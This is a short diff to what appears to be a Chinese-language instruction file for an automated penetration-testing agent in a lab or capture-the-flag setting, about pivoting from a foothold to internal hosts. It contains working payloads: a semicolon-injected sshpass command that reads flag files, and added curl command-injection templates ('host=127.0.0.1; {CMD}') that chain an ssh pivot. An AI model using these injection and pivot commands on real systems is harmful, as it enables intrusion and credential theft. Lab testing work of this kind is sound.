@@ -16,6 +16,9 @@
 - ssh（有口令）：在立足点上 `;sshpass -p '<pwd>' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 <user>@<host> 'hostname; id; cat flag* 2>/dev/null'`
 - 成功在内网主机上执行 = 新 shell 立足点 → `report_foothold(access_level="shell", label="shell@<host>", location="<host>", evidence=真实输出)`
 - 拿到的敏感文件/flag → report_loot；新凭据 → report_credential。
+- **带 `replay.command_template`**（引擎会用随机 nonce 回环主动坐实该立足点，按主机限定）：一条把 `{CMD}` 送进【该主机】shell 的命令。例：
+  - web 命令注入入口机：`replay={"command_template": "curl -s -G 'http://lab-member:8080/ping' --data-urlencode 'host=127.0.0.1; {CMD}'"}`
+  - 经立足点 ssh 到的内网机：`replay={"command_template": "curl -s -G 'http://lab-edge:8080/ping' --data-urlencode 'host=127.0.0.1; sshpass -p <pwd> ssh -o StrictHostKeyChecking=no <user>@<host> {CMD}'"}`（{CMD} 最终在内网机上执行）
 
 ## 要点
 - 内网主机是经**立足点转发**打的，命令要嵌在对立足点的 exec 里（命令注入分号、或 ssh 远程命令）。
